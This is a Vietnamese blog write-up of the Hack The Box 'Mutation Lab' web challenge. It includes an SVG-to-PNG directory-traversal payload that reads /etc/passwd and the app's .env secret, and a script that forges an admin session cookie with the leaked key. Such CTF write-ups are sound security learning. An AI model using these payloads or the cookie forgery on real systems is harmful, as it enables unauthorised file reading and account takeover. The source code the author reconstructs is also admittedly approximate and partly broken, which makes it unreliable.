---
title: HTB - Mutation Lab
description: Write up for Mutation Lab in HackTheBox
summary: Write up for Mutation Lab in HackTheBox
cover: ./cover.jpg
coverCaption: Hack The Box's main page
published: '2022-06-03T22:00:00.000+08:00'
updated: '2022-06-03T12:00:00.000+08:00'
toc: false
tags:
  - [ ctf ]
---

# Foreword
Đây là một challenge trong mục web của Hack The Box, challenge này từ sự kiện hackthebox Cyber Apocalypse CTF 2022 mà mình đã không tham gia. Nay vào làm thì thấy nó released trên trang chủ luôn nên mình làm cho vui.

# Solution
Mới vào thì web sẽ hiện cho ta một form đăng kí, đăng nhập như sau:

![image](https://user-images.githubusercontent.com/75429369/171791521-df1d7302-4033-4fe8-8c3d-a32eaca40643.png)

Sau một hồi thử sqli thì không có gì đặc biệt cả, mình sẽ đăng nhập vào để xem bên trong có gì:

![image](https://user-images.githubusercontent.com/75429369/171791819-ba3f76ab-8782-47f2-a85d-6a185f307a11.png)

Giao diện trong khá ảo ma nhỉ, ta có thể rê chuột vào 2 cái hình động kia sẽ có hoạt ảnh trông rất thú vị. 

Mình thử nút `Export` bên dưới xem có gì hay ho không.

![image](https://user-images.githubusercontent.com/75429369/171791974-45801b11-3881-4825-872b-9d92bd590f1d.png)

Web đã xuất ra một bức ảnh `.png` và có uri exports để lưu bức ảnh này, cùng xem thử trong quá trình export đã có request như thế nào.

```
POST /api/export HTTP/1.1
Host: 159.65.92.13:31751
Content-Length: 3230
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.92.13:31751
Referer: http://159.65.92.13:31751/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJ1c2VybmFtZSI6Im10aWVubm5ubiJ9; session.sig=e1cXHePRSVWGyVYjR45Gt-8f1v8
Connection: close

{"svg":"<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"500\" height=\"400\" viewBox=\"0,0,500,400\"><g fill=\"#e74c3c\" fill-rule=\"nonzero\" stroke=\"none\" stroke-width=\"1\" stroke-linecap=\"butt\" stroke-linejoin=\"miter\" stroke-miterlimit=\"10\" stroke-dasharray=\"\" stroke-dashoffset=\"0\" font-family=\"none\" font-weight=\"none\" font-size=\"none\" text-anchor=\"none\" style=\"mix-blend-mode: normal\"><path d=\"M58.81077,277.73462c17.48102,-86.6988 17.48102,-86.6988 -10.01256,-99.30301c-27.49358,-12.60421 -27.49358,-12.60421 -27.49358,91.82529c0,104.4295 2.06633,104.4295 11.04573,99.30301c8.9794,-5.12649 8.9794,-5.12649 26.46042,-91.82529z\"/><path d=\"M118.05814,166.94914c39.30895,-15.47572 39.30895,-15.47572 45.94716,-79.17471c6.63822,-63.69898 6.63822,-63.69898 -66.80253,-63.69898c-73.44074,0 -73.44074,0 -73.44074,66.5705c0,66.5705 0,66.5705 27.49358,79.17471c27.49358,12.60421 27.49358,12.60421 66.80253,-2.87152z\"/><path d=\"M154.01163,374.48502c72.98165,0 72.98165,0 86.33736,-7.89551c13.35571,-7.89551 13.35571,-7.89551 14.16973,-80.04817c0.81402,-72.15266 0.81402,-72.15266 -46.72862,-99.40551c-47.54264,-27.25284 -47.54264,-27.25284 -86.85159,-11.77712c-39.30895,15.47572 -39.30895,15.47572 -56.78996,102.17452c-17.48102,86.6988 -17.48102,86.6988 -0.29979,91.82529c17.18123,5.12649 17.18123,5.12649 90.16288,5.12649z\"/><path d=\"M32.48736,374.63742c-8.9794,5.12649 -8.9794,5.12649 17.18123,5.12649c26.16062,0 26.16062,0 8.9794,-5.12649c-17.18123,-5.12649 -17.18123,-5.12649 -26.16062,0z\"/><path d=\"M325.04437,182.79643c63.50827,-23.72707 63.50827,-23.72707 54.66376,-90.95183c-8.84451,-67.22476 -8.84451,-67.22476 -104.41269,-67.22476c-95.56818,0 -95.56818,0 -102.2064,63.69898c-6.63822,63.69898 -6.63822,63.69898 40.90442,90.95183c47.54264,27.25284 47.54264,27.25284 111.05091,3.52578z\"/><path d=\"M316.43828,374.63919c22.48412,0 22.48412,0 81.75938,-28.93053c59.27526,-28.93053 59.27526,-28.93053 49.82962,-93.02798c-9.44564,-64.09745 -9.44564,-64.09745 -32.41834,-74.84471c-22.9727,-10.74726 -22.9727,-10.74726 -86.48097,12.9798c-63.50827,23.72707 -63.50827,23.72707 -64.32229,95.87973c-0.81402,72.15266 -0.81402,72.15266 14.16722,80.04817c14.98124,7.89551 14.98124,7.89551 37.46537,7.89551z\"/><path d=\"M245.73418,371.74088c-13.35571,7.89551 -13.35571,7.89551 14.98124,7.89551c28.33695,0 28.33695,0 13.35571,-7.89551c-14.98124,-7.89551 -14.98124,-7.89551 -28.33695,0z\"/><path d=\"M419.18975,169.25139c22.9727,10.74726 22.9727,10.74726 40.64657,5.24788c17.67387,-5.49939 17.67387,-5.49939 17.67387,-77.97202c0,-72.47264 0,-72.47264 -49.49108,-72.47264c-49.49108,0 -49.49108,0 -40.64657,67.22476c8.84451,67.22476 8.84451,67.22476 31.81721,77.97202z\"/><path d=\"M470.92452,323.90736c8.22823,8.08264 8.22823,8.08264 8.22823,-69.59684c0,-77.67947 0,-77.67947 -17.67387,-72.18009c-17.67387,5.49939 -17.67387,5.49939 -8.22823,69.59684c9.44564,64.09745 9.44564,64.09745 17.67387,72.18009z\"/><path d=\"M401.13118,349.63785c-59.27526,28.93053 -59.27526,28.93053 8.22823,28.93053c67.50349,0 67.50349,0 67.50349,-20.84789c0,-20.84789 0,-20.84789 -8.22823,-28.93053c-8.22823,-8.08264 -8.22823,-8.08264 -67.50349,20.84789z\"/></g></svg>"}
```

Hmm, như vậy có thể suy luận: lúc mình nhấn `export` thì web đã gửi một POST request với data là `svg`, data svg ấy sẽ tạo ra ảnh `png` và lưu lại với tên file `<gì gì đấy>.png` trong mục `exports`. Từ đây sẽ có một hướng suy nghĩ là cái data svg này mình hoàn toàn có thể điều khiển được và file svg đổi thành png ấy hoàn toàn được lưu trên server nên ta có thể dùng nó dể exploit.

Tới đây thì mình đi tìm xem cái `svg to png` (hay đại loại vậy) có lỗi bảo mật bị report trên internet hay chưa để giải bài này, vì ai chơi Hackthebox cũng biết rằng site này rất thích ra challenge có lỗi dựa trên việc sử dụng những module hay thư viện với phiên bản cũ. Mình tìm được khá nhiều nguồn và cuối cùng tìm được bài [này](https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785). Đại khái là packet `convert-svg-core`có bug. Trang này viết như sau:

![image](https://user-images.githubusercontent.com/75429369/171794796-168e7d66-9f46-4914-ac6d-e5404b4bfbc3.png)

>"Affected versions of this package are vulnerable to Directory Traversal. Using a specially crafted SVG file, an attacker could read arbitrary files from the file system and then show the file content as a converted PNG file."

Dòng trên đọc khá là đúng hướng làm của bài này, có sẵn POC ở dưới nên mình sẽ dùng thử xem như thế nào.

```
<svg-dummy></svg-dummy> <iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"></iframe> <svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"> <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text> </svg>

# nhớ thêm backslash để escape character
```

![image](https://user-images.githubusercontent.com/75429369/171794237-2d484fa3-0798-4afe-a965-5ef7f755e61a.png)

Access để xem có gì nào

![image](https://user-images.githubusercontent.com/75429369/171794287-5901d24a-237b-418b-a77d-3e671db2fd53.png)

Yay đọc được etc/passwd, vậy là POC hoạt động mượt :))

`/app/index.js`:

![image](https://user-images.githubusercontent.com/75429369/171825288-84d057cd-bf25-474d-95aa-f342540460cf.png)

app/index.js
```js
const express = require('express');
const session = require('cookie-session');
const app = express() ;
const path = require('path');
const cookieParser = require('cookie-parser');
const nunjucks = require('nunjucks');
const routes = require('./routes');
const Database = require('./database');

const db = new Database('database.db');

app.use(express.json({limit: '2mb'})); 
app.use(cookieParser(); 

require('dotenv').config({ path: '/app/.env'}); 
app.use(session({
	name: 'session',
	keys: [process.env.SESSION_SECRET_KEY] 
}))

nunjucks.configure('views', {
	autoescape: true,
	express: app 
});

app.set('views', './views'); 
app.use('/static', express.static(path.resolve('static')));
app.use('/exports', express.static(path.resolve('exports')));

app.use(routes (db));

app.all('*', (req, res) => { 
	return res.status (404).send({
		message: '404 page not found'
	});
});

(async () => {
	await db.connect();
	await db.migrate();
	app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```
_Note: source có thể không giống 100% tại mình copy bằng blackbox nên sợ không đúng, mong các bạn thông cảm_

Okay, dễ thấy web có sử dụng `cookie-session`, include thư mục `./routes` và `./database`, nhưng chỗ cần chú ý nhất là `SESSION_SECRET_KEY` có thể được include từ `/app/.env`, thử đọc thư mục này xem có SECRET KEY không nhé

![image](https://user-images.githubusercontent.com/75429369/171844184-df728cd5-9ec4-4a9f-bb9e-325207ac3012.png)

Yes, vậy có thể hình dung được ta sẽ dùng SECRET KEY này để generate lại một cookie của user nào đó có thể đọc được flag, để mình check xem thử cookie hiện tại là gì. 

![image](https://user-images.githubusercontent.com/75429369/171844465-60638acb-6ba5-4671-99fc-3d86ddb049b0.png)

`session` thì khi decode bằng base64 thì ta được `{"username":"mtiennnnn"}` -> đúng như username dùng để đăng kí và đăng nhập, còn `session.sig` có vẻ như được generate từ session. Vậy thì giờ chỉ cần tìm xem còn username nào có thể đọc được flag. Check thử `./routes/index.js` thì thấy

![image](https://user-images.githubusercontent.com/75429369/171844999-50237d26-eb74-47ba-9d44-03f8e9491f42.png)

/app/routes/index.js
```js
const fs = require('fs'); 
const path = require('path'); 
const crypto = require('crypto'); 
const express = require('express'); 
const router = express. Router({caseSensitive: true});
const AuthMiddleware = require('../middleware/AuthMiddleware'); 
const { convert } = require('convert-svg-to-png'); 
const { execSync } = require('child_process'); 
let db;

const response = data => ({ message: data});

router.get('/', (req, res) => {
	return res.render('login.html');
});

router.post('/api/register', async (req, res) => {
	const { username, password } = req.body;

	if (username && password) {
		return db.getUser(username)
			.then(user => {
				if (user) return res.status(401).send(response('This UUID is already registered!'));
				return db.registerUser(username, password)
					.then(() => res.send(response('Account registered successfully!')))
			})
			.catch(() => res.status(500).send(response('SOmething went wrong!')));
	}
	return res.status(401).send(response('Please fill out all the required fields!'));
});

router.post('/api/login', async (req, res) => {
	const { username, password } = req.body;

	if (username && password) {
		return db.loginUser(username, password)
			.then(user => {
				req.session.username = user.username;
				res.send(response('User authenticated successfully!'));
			})
			.catch((e) => {
				console.log(e);
				res.status(403).send(response('Invalid UUID or password!'));
			});
	}
	return res.status(500).send(response('Missing parameters!'));
});

router.get('/dashboard', AuthMiddleware, async (req, res, next) => {
	if (req.session.username === 'admin') {
		let flag = execSync('../readflag').toString();
		return res.render('admin.html', { flag });
	}
	return res.render('dashboard.html');
});

router.post('/api/export', async (req, res, next) => {
	const { svg } = req.body;

	try {
		const png = await convert{
			svg,
			{
				...
			}
		}
	}
})
```
_Note: source có thể không giống 100% tại mình copy bằng blackbox nên sợ không đúng, mong các bạn thông cảm_

Lần đầu tiên trong bài, ta thấy sự hiện diện của `flag`, vậy với `username` là `admin` thì web sẽ render flag ra cho ta (nghe ez vãi). But wait, username thì ta biết có thể tùy chỉnh từ cookie `session`, vậy còn `session.sig` ???  Như đã nói ở trên, vì chúng ta đã tìm được SESSION_SECRET_KEY, với SECRET KEY đó ta có thể sign ra bất cứ session cookie nào ta mong muốn. Vậy thì mục tiêu cuối cùng của bài sẽ là generate ra `session.sig` với username là `admin`.

Tận dụng code có sẵn của bài, ta sẽ tự generate cookie session.sig ở local rồi sử dụng nó lên web chính thì sẽ lấy được flag. Script generate:

script app.js
```js
const express = require('express');
const session = require('cookie-session');
const app = express();
const cookieParser = require('cookie-parser');

app.use(cookieParser()); 
app.use(session({
	name: 'session',
	keys: ['fc8c7ef845baff7935591112465173e7']
}))

app.get('/', (req, res) => {
	req.session.username = 'admin'
	res.status(200).send(('done'));
});

app.listen(6969);
```

Access tới `localhost:6969`, lấy cookie rồi xài cookie đó với web chính vàaaaaaa...

![image](https://user-images.githubusercontent.com/75429369/171847225-42823085-69ec-43ce-bc7b-3807b9e76f6f.png)

![image](https://user-images.githubusercontent.com/75429369/171847333-5bcaa4a5-d929-476b-b44f-6fe917cbc354.png)

flag kìaaaaa

# Conclusion
Thật sự mà nói bài này khó hay không thì mình thấy là không, thậm chí nó còn bị nhiều người đánh giá dễ trên HTB, nhưng vẫn nằm trong mục `medium` vì bài này đòi hỏi nhiều kĩ năng và một chút may mắn nữa :)), nhìn chung là một challenge hay, học được thêm nhiều skill mới~!!

_Thanks for reading_
